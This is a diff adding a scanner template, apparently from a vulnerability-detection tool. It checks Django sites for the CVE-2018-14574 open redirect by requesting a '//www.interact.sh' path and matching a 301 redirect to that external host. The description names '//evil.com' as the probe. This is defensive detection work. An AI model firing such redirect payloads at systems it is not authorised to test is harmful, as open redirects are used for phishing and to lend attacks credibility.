@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 Django CommonMiddleware 开放重定向漏洞，通过访问 //evil.com 路径验证是否被重定向到外部域名"
+id = "POC-AVE-2018-0085"
+name = "CVE-2018-14574 Django Open Redirect PoC"
+severity = "medium"
+tags = [
+    "cve-2018-14574",
+    "django",
+    "redirect",
+]
+vuln_id = [
+    "CVE-2018-14574",
+    "AVE-2018-0085",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}//www.interact.sh"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "Location: https://www.interact.sh",
+    "Location: http://www.interact.sh",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [301]
+type = "status"
